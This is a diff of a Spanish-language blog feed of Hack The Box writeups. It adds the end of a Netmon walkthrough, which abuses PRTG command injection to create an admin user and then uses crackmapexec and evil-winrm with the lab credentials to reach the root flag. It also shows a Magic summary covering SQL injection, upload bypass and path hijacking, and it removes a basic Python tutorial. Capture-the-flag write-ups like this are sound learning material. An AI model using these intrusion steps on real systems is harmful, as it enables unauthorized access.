+&lt;p&gt;podemos ver varios inputs y si los inspeccionamos encontramos el de &lt;code&gt;message_10&lt;/code&gt; que corresponde a &lt;code&gt;Parameter&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ejecutamos en el campo la instrucción, donde crearemos nuestro usuario y lo añadiremos al grupo administrador.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Guardamos y ahora en la notificación creada le damos en el simbolo de la campana &lt;code&gt;Send&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Netmon/netmon12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Le damos ok en la confirmación y ya deberia haberse ejecutado la acción.&lt;/p&gt;
+
+&lt;p&gt;Como vimos que el puerto &lt;code&gt;445&lt;/code&gt; esta abierto podemos usar &lt;code&gt;crackmapexec&lt;/code&gt; y validamos que el usuario &lt;code&gt;fmiracle&lt;/code&gt; ahora existe y forma parte de los usuarios &lt;code&gt;administradores&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
+SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
+SMB         10.10.10.152    445    NETMON           [+] netmon\pentest:p3nT3st! (Pwn3d!)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora haciendo uso del servicio de administración remota de windows, podemos conectarnos por el puerto &lt;code&gt;5985&lt;/code&gt;, usando la herramienta &lt;code&gt;evil-winrm&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\pentest\Documents&amp;gt; cd C:\Users
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Una vez ya en el sistema podemos dirigirnos al directorio personal del usuario &lt;code&gt;Administrator&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Users&amp;gt; cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator&amp;gt; cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
+491b992fe825994a2fad4199afd2ca76
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Tue, 13 Jun 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Netmon</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Netmon</guid>
+        
+        <category>ftp enumeration</category>
+        
+        <category>absing PRTG Network Monitor</category>
+        
+        <category>Command Injection RCE</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
+    
+      <item>
         <title>Maquina Magic - htb writeup</title>
-        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Time&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de &lt;code&gt;Jackson CVE-2019-12384&lt;/code&gt;, y aprovecharemos la vulnerabilidad &lt;code&gt;SSRF&lt;/code&gt; derivandola en una ejecucion remota de comandos &lt;code&gt;RCE&lt;/code&gt; que nos dara acceso al sistema, para que finalmente aprovechandonos de una tarea &lt;code&gt;Cron&lt;/code&gt; podamos obtener acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+        <description>&lt;p&gt;En esta ocasión vamos a resolver la máquina &lt;code&gt;Magic&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad media, la cual explotaremos evadiendo el panel de logeo mediante una inyeccion simple en sql, despues aprovecharemos de una mala sanizitación de subida de archivos derivandola en una ejecución remota de comandos; una vez dentro del sistema obtendremos credenciales enumerando la base de datos y finamente aprocecharemos el permiso &lt;code&gt;suid&lt;/code&gt; de un binario, para ejecutar una &lt;code&gt;path hijacking&lt;/code&gt; que nos dara acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
 
@@ -490,11 +943,17 @@ a4f562d7949903aa1bf84994c94ce9e3
         <link>http://localhost:4000/hackthebox/htb-writeup-Magic</link>
         <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Magic</guid>
         
-        <category>Jackson CVE-2019-12384 Exploitation</category>
+        <category>sql injection</category>
         
-        <category>SSRF to RCE</category>
+        <category>bypass upload file</category>
         
-        <category>Abusing Cron Job</category>
+        <category>information leaked</category>
+        
+        <category>abusing mysql</category>
+        
+        <category>absusing suid</category>
+        
+        <category>path hijacking</category>
         
         
         <category>hackthebox</category>
@@ -6438,3349 +6897,6 @@ root
         
         
         <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Aprende Python desde cero a avanzado curso completo</title>
-        <description>&lt;p&gt;En esta ocasion hablaremos del lenguaje de programacion &lt;code&gt;Python3&lt;/code&gt;, realizaremos todo un curso completo desde lo mas basico y explicaremos todo lo escencial para que se pueda llegar a dominar este lenguaje.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;El articulo se ira actualizando constantemente - Ultima actualización &lt;code&gt;28 - 05 - 2023&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;que-es-python3&quot;&gt;Que es Python3?&lt;/h1&gt;
-
-&lt;p&gt;Python3 es un lenguaje de programación ampliamente utilizado en las aplicaciones web, el desarrollo de software, la ciencia de datos y el machine learning. Es preferido entre los desarrolladores porque es eficiente y fácil de aprender, además de que se puede ejecutar en muchas plataformas diferentes, se integra bien a todos los tipos de sistemas y aumenta la velocidad del desarrollo. El software podemos descargarlo gratis de su pagina oficial.&lt;/p&gt;
-
-&lt;h2 id=&quot;indice-y-estructura&quot;&gt;Indice y Estructura&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;#que-es-Python3?&quot;&gt;Que es Python3&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#sintaxis&quot;&gt;Sintaxis&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#variables&quot;&gt;Variables&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#tipos-de-variables&quot;&gt;Tipos de Variables&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#asignación-multiple-de-variables&quot;&gt;Asignación Multiple de Variables&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#sintaxis-de-variables&quot;&gt;Sintaxis de Variables&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#strings&quot;&gt;Strings&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#indexación&quot;&gt;Indexación&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#slicing&quot;&gt;Slicing&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#stride&quot;&gt;Stride&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#modificación-de-strings&quot;&gt;Modificación de Strings&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#strings-de-multiples-lineas&quot;&gt;Strings de multiples lineas&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#numeros&quot;&gt;Numeros&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#numeros-enteros&quot;&gt;Numeros Enteros&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#numeros-flotantes&quot;&gt;Numeros Flotantes&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#numeros-complejos&quot;&gt;Numeros Complejos&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#comentarios&quot;&gt;Comentarios&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#comentarios-de-varias-lineas&quot;&gt;Comentarios de Varias Lineas&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#operadores-aritmeticos&quot;&gt;Operadores Aritmeticos&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#suma-y-resta&quot;&gt;Suma y Resta&lt;/a&gt;
-        &lt;ul&gt;
-          &lt;li&gt;&lt;a href=&quot;#sumar-y-restar-datos-numericos&quot;&gt;Sumar y restar datos Numericos&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#sumar-y-restar-datos-strings&quot;&gt;Sumar y restar datos Strings&lt;/a&gt;&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#multiplicación-y-división&quot;&gt;Multiplicación y División&lt;/a&gt;
-        &lt;ul&gt;
-          &lt;li&gt;&lt;a href=&quot;#multiplicar-y-dividir-datos-numericos&quot;&gt;Multiplicar y dividir datos Numericos&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#multiplicar-y-dividir-datos-strings&quot;&gt;Multiplicar y dividir datos Strings&lt;/a&gt;&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#modulo&quot;&gt;Modulo&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#exponencial&quot;&gt;Exponencial&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#division-entera&quot;&gt;Division Entera&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#operadores-de-asignación&quot;&gt;Operadores de Asignación&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#booleanos&quot;&gt;Booleanos&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#operadores-de-comparación&quot;&gt;Operadores de Comparación&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#comparación-entre-datos-numericos&quot;&gt;Comparación entre datos numericos&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#comparación-entre-datos-strings&quot;&gt;Comparación entre datos strings&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#operadores-de-identidad&quot;&gt;Operadores de Identidad&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#operadores-de-pertenencia&quot;&gt;Operadores de Pertenencia&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#operadores-logicos&quot;&gt;Operadores Logicos&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#operador-not&quot;&gt;Operador not&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#operador-or&quot;&gt;Operador or&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#operador-and&quot;&gt;Operador and&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#listas&quot;&gt;Listas&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#acceso-a-elementos-de-una-lista&quot;&gt;Acceso a elementos de una lista&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#operaciones-con-listas&quot;&gt;Operaciones con listas&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#listas-anidadas&quot;&gt;Listas anidadas&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#las-listas-son-mutables&quot;&gt;Las listas son mutables&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#funciones&quot;&gt;Funciones&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#funciones-personalizadas&quot;&gt;Funciones Personalizadas&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#argumentos-de-las-funciones&quot;&gt;Argumentos de las Funciones&lt;/a&gt;
-        &lt;ul&gt;
-          &lt;li&gt;&lt;a href=&quot;#argumentos-posicionales&quot;&gt;Argumentos Posicionales&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#argumentos-de-palabras-clave&quot;&gt;Argumentos de Palabras Clave&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#parametros-con-valores-por-defecto&quot;&gt;Parametros con Valores por Defecto&lt;/a&gt;&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#sentencia-return&quot;&gt;Sentencia Return&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#docstring&quot;&gt;Docstrings&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#funciones-propias-de-python&quot;&gt;Funciones Propias de Python&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#tuplas&quot;&gt;Tuplas&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#funcionamiento-de-las-tuplas&quot;&gt;Funcionamiento de las Tuplas&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#cuando-utilizar-una-tupla-en-vez-de-una-lista&quot;&gt;Cuando utilizar una Tupla en vez de una Lista&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#tuplas-y-tipos-de-datos-numericos&quot;&gt;Tuplas y tipos de datos Numericos&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#packing-y-unpacking---empaquetado-y-desempaquetado&quot;&gt;Packing y Unpacking - Empaquetado y Desempaquetado&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#diccionarios&quot;&gt;Diccionarios&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#acceso-a-los-elementos-de-un-diccionario&quot;&gt;Acceso a los elementos de un Diccionario&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#elementos-de-un-diccionario&quot;&gt;Elementos de un Diccionario&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#operaciones-con-diccionarios&quot;&gt;Operaciones con Diccionarios&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#sets&quot;&gt;Sets&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#funcionamiento-de-un-set&quot;&gt;Funcionamiento de un Set&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#frozenset&quot;&gt;Frozenzet&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#nonetype&quot;&gt;Nonetype&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#funcionamiento&quot;&gt;Funcionamiento&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#estructuras-de-control-de-flujo&quot;&gt;Estructuras de Control de Flujo&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#sentencia-if,-elif-y-else&quot;&gt;Sentencia If, elif y else&lt;/a&gt;
-        &lt;ul&gt;
-          &lt;li&gt;&lt;a href=&quot;#sentencia-if&quot;&gt;Sentencia If&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#clausula-else&quot;&gt;Clausula Else&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#clausula-elif&quot;&gt;Clausula Elif&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#sentencia-if-en-una-linea&quot;&gt;Sentencia If en una linea&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#operador-condicional&quot;&gt;Operador Condicional&lt;/a&gt;&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#sentencia-for&quot;&gt;Sentencia For&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;sintaxis&quot;&gt;Sintaxis &lt;a href=&quot;#sintaxis&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Cuando hablamos de la sintaxis en Python3, nos referimos como en todo lenguaje al correcto uso y orden de las palabras que utilizamos para comunicarnos. Por ello, en Python3 también es necesario cumplir ciertos requisitos a la hora de expresarnos.&lt;/p&gt;
-
-&lt;p&gt;Comenzaremos con la sintaxis tipica que nos ayuda a imprimir los valores concretamente su nombre es &lt;code&gt;print&lt;/code&gt; que viene a ser una funcion interna de Python que recibe una variable o tipo de dato y nos lo muestra por pantalla, por ahora solo hay que tener presente el concepto de &lt;code&gt;print&lt;/code&gt; ya que mas adelante profundizaremos en los demas conceptos que nos ayudaran a comprender mejor como funciona este lenguaje.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(&quot;Hola Python3&quot;)
-
-Hola Python3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;variables&quot;&gt;Variables &lt;a href=&quot;#variables&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Una variable es un elemento de un lenguaje de programación que tiene asignado un valor determinado. Para crear una variable en Python3 debemos proporcionarle un nombre y asignarle un valor utilizando el símbolo &lt;code&gt;=&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;Hola Python3&quot;
-
-print(variable)
-
-Hola Python3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora el valor asignado a la variable puede cambiar a lo largo del codigo a otra difierente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;Hola Python3&quot;
-
-print(variable)
-
-Hola Python3
-
-variable2 = &quot;Adios Python3&quot;
-
-print(variable)
-
-Adios Python3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;tipos-de-variables&quot;&gt;Tipos de Variables&lt;/h2&gt;
-
-&lt;p&gt;Existen 4 tipos de variables principales o primitivas en Python3, concretamente estas son:&lt;/p&gt;
-
-&lt;p&gt;Tipo&lt;code&gt;int&lt;/code&gt;: Para representar numeros enteros.
-Tipo &lt;code&gt;string&lt;/code&gt;: Para representar texto o cadenas.
-Tipo &lt;code&gt;boolean&lt;/code&gt;: Para representar datos binarios, es decir que pueden tomar los valores &lt;code&gt;True&lt;/code&gt; o &lt;code&gt;False&lt;/code&gt;.
-Tipo &lt;code&gt;float&lt;/code&gt;: Para representar numeros con decimales.&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Representacion&lt;/th&gt;
-      &lt;th&gt;Tipo&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;numeros enteros&lt;/td&gt;
-      &lt;td&gt;int&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;cadenas de texo&lt;/td&gt;
-      &lt;td&gt;string&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;numeros decimales&lt;/td&gt;
-      &lt;td&gt;float&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;dato binario(True o False)&lt;/td&gt;
-      &lt;td&gt;boolean&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Definimos un conjunto de variables segun su tipo y usamos la funcion reservada de python &lt;code&gt;type()&lt;/code&gt; para ver el tipo de variable segun su asignacion:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable1 = 10
-
-variable4 = 2.4
-
-variable2 = &quot;Hola Python&quot;
-
-variable3 = True
-
-variable4 = 2.4
-
-type(variable1)
-
-int
-
-type(variable2)
-
-str
-
-type(variable3)
-
-bool
-
-type(variable4)
-
-float
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;asignación-multiple-de-variables&quot;&gt;Asignación Multiple de Variables&lt;/h2&gt;
-
-&lt;p&gt;En Python3 podemos asignar una variable a otra variable diferente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;Hola Python3&quot;
-
-variable2 = variable
-
-print(variable2)
-
-Hola Python3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;sintaxis-de-variables&quot;&gt;Sintaxis de Variables&lt;/h2&gt;
-
-&lt;p&gt;En Python3 se debe cumplir con las reglas sintácticas definidas por el leguaje. A continuación indicamos las reglas que debemos cumplir cuando definimos el nombre de una variable:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Las variables en Python3 pueden tener cualquier longitud y pueden consistir en letras mayúsculas y minúsculas &lt;code&gt;A-Z, a-z&lt;/code&gt;, dígitos del &lt;code&gt;0-9&lt;/code&gt; y el carácter de subrayado o subguion &lt;code&gt;_&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;_variable = &quot;Hola Python3&quot;
-
-print(_variable)
-
-Hola Python3
-
-vAriAbLe = &quot;Hola Python3&quot;
-
-print(vAriAbLe)
-
-Hola Python3
-
-variable_1_1 = &quot;Hola Python3&quot;
-
-print(variable_1_1)
-
-Hola Python3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Si no se cumple con las reglas definidas de sintaxys, emitiran un error&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;  variable$ = &quot;Hola Python3&quot;
-
-    File &quot;&amp;lt;iPython3-input-12-f520f3dd0eb3&amp;gt;&quot;, line 1
-      variable$ = &quot;Hola Python3&quot;
-         ^
-  SyntaxError: invalid syntax
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;El nombre de una variable puede contener dígitos, pero el primer caracter de un nombre de variable no puede ser un dígito.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;  1variable = &quot;Hola Python3&quot;
-
-    File &quot;&amp;lt;iPython3-input-13-905ee4ad3fed&amp;gt;&quot;, line 1
-      1variable = &quot;Hola Python3&quot;
-     ^
-  SyntaxError: invalid syntax
-&lt;/code&gt;&lt;/pre&gt;
-&lt;ul&gt;
-  &lt;li&gt;El nombre de las variables en Python3 es sensible a mayúsculas y minúsculas&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;   Variable1 = &quot;Hola Python3&quot;
-
-   print(variable1)
-
-   ---------------------------------------------------------------------------
-   NameError                                 Traceback (most recent call last)
-   &amp;lt;iPython3-input-15-32693f267891&amp;gt; in &amp;lt;module&amp;gt;
-   ----&amp;gt; 1 print(variable1)
-
-   NameError: name 'variable1' is not defined
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;Strings&quot;&gt;Strings &lt;a href=&quot;#Strings&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Un string se corresponde con un conjunto de caracteres que forman una cadena de texto.&lt;/p&gt;
-
-&lt;p&gt;La sintaxis que debemos utilizar para definir strings en Python consiste en situar los caracteres entre &lt;code&gt;&quot; o '&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable1 = &quot;Esto es mi primer string&quot;
-
-variable2 = 'Esto es mi segunda string'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;La flexibilidad de definir &lt;code&gt;string&lt;/code&gt; con el caracter “ y el caracter ‘ nos permite definir cadenas de texto que contienen esos mismos caracteres.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable1 = 'Los tipos strings pueden definirse con el caracter &quot;'
-
-variable2 = &quot;Los tipos strings pueden definirse con el caracter '&quot;
-
-print(variable1)
-
-Los strings pueden definirse con el caracter &quot;
-
-print(variable2)
-
-Los strings pueden definirse con el caracter '
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;indexación&quot;&gt;Indexación&lt;/h2&gt;
-
-&lt;p&gt;En muchos tipos de datos en Python3 se puede acceder a los elementos individuales de un conjunto de datos directamente mediante un índice numérico o un valor clave. Este proceso se denomina &lt;code&gt;indexación&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;En Python3, las cadenas son secuencias ordenadas de caracteres, y por lo tanto pueden ser indexadas de esta manera. Se puede acceder a los caracteres individuales de una cadena especificando el nombre de la cadena seguido de un número entre corchetes &lt;code&gt;[]&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;El primer carácter de la cadena tendra el índice 0, el siguiente el índice 1, y así sucesivamente. El índice del último carácter será la longitud de la cadena menos uno.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Python&quot;
-
-lenguaje[0]
-
-'P'
-
-lenguaje[2]
-
-'t'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos tambien utilizar números negativos para extraer los caracteres por el final de la cadena de texto, donde &lt;code&gt;-1&lt;/code&gt; seria la parte final y asi sucesivamente de derecha a izquierda.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje[-1]
-
-'n'
-
-lenguaje[-3]
-
-'h'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;slicing&quot;&gt;Slicing&lt;/h2&gt;
-
-&lt;p&gt;Python3 permite una sintaxis específica de indexación que extrae subcadenas de una cadena de texto, a esto se denomina ‘&lt;code&gt;slicing&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;La sintaxis que se utiliza para extraer una subcadena de una cadena de nombre &lt;code&gt;micadena&lt;/code&gt; es de la forma &lt;code&gt;micadena[x:y]&lt;/code&gt;, esto devuelve la parte de la cadena &lt;code&gt;micadena&lt;/code&gt; que comienza en la posición &lt;code&gt;x&lt;/code&gt;,y termina en la posición &lt;code&gt;y&lt;/code&gt;; con la exepción de que no se incluye el último caracter.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Hola Python&quot;
-
-lenguaje[0:4]
-
-'Hola'
-
-lenguaje[-6:-1]
-
-'Pytho'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Podemos observar que efectivamente no se incluye el ultimo caracter que se especifica: &lt;code&gt;ojo tener en cuenta que los espacios tambien son caracteres correspondientes a una cadena vacia&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Pero que pasaria entonces si no indicamos uno de los numeros:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Hola Python&quot;
-
-lenguaje[-6:]
-
-'Python'
-
-lenguaje[5:]
-
-'Python'
-&lt;/code&gt;&lt;/pre&gt;
-
